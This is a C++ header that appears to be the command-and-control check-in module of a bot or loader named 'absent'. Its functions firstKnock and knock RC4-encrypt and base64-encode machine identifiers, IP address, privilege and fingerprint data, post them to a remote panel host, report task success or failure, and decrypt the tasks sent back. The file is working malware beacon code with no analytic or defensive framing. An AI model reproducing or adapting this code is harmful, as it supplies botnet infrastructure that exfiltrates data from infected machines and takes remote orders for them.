#pragma once
#include <string>

namespace absent
{
	namespace panel
	{
		nlohmann::json decryptResponce(std::string res, std::string key)
		{
			absent::crypto::RC4 rc4;
			nlohmann::json responce = nlohmann::json::parse(absent::crypto::b64::decode(res.c_str()));
			for (auto& el : responce.items()) { std::string val = el.value(); el.value() = rc4.crypt(absent::crypto::b64::decode(val.c_str()), key); }
			return responce;

		}

		nlohmann::json firstKnock(std::string host, std::string path, nlohmann::json info, std::string key)
		{
			absent::crypto::RC4 rc4;

			for (auto& el : info.items()) { if (el.key() != "fp") { el.value() = absent::crypto::b64::encode(rc4.crypt(el.value(), key).c_str()); } }
			for (int ip = 0; ip < info["fp"].size(); ip++) { info["fp"][ip] = absent::crypto::b64::encode(rc4.crypt(info["fp"][ip], key).c_str()); }
			std::string toSend = absent::crypto::b64::encode(info.dump().c_str());
			toSend = "request=" + toSend;

			std::string res = absent::http::post(host, path, toSend);
			return decryptResponce(res, key);
		}

		nlohmann::json knock(std::string host, std::string path, nlohmann::json info, std::string key, std::string task, bool failed)
		{
			absent::crypto::RC4 rc4;
			std::string status;
			if (failed) { status = "Failed"; }
			if (!failed) { status = "Success"; }
			nlohmann::json smallInfo = 
			{
				{"check", absent::crypto::b64::encode(rc4.crypt("check", key).c_str())},
				{"hw", absent::crypto::b64::encode(rc4.crypt(info["hw"], key).c_str())},
				{"bu", absent::crypto::b64::encode(rc4.crypt(info["bu"], key).c_str())},
				{"ip", absent::crypto::b64::encode(rc4.crypt(info["ip"], key).c_str())},
				{"pr", absent::crypto::b64::encode(rc4.crypt(info["pr"], key).c_str())},
				{"ct", absent::crypto::b64::encode(rc4.crypt(task, key).c_str())},
				{"st", absent::crypto::b64::encode(rc4.crypt(status, key).c_str())}
			};
			std::string toSend = absent::crypto::b64::encode(smallInfo.dump().c_str());
			toSend = "request=" + toSend;
			
			std::string res = absent::http::post(host, path, toSend);
			return decryptResponce(res, key);
		}
	}
}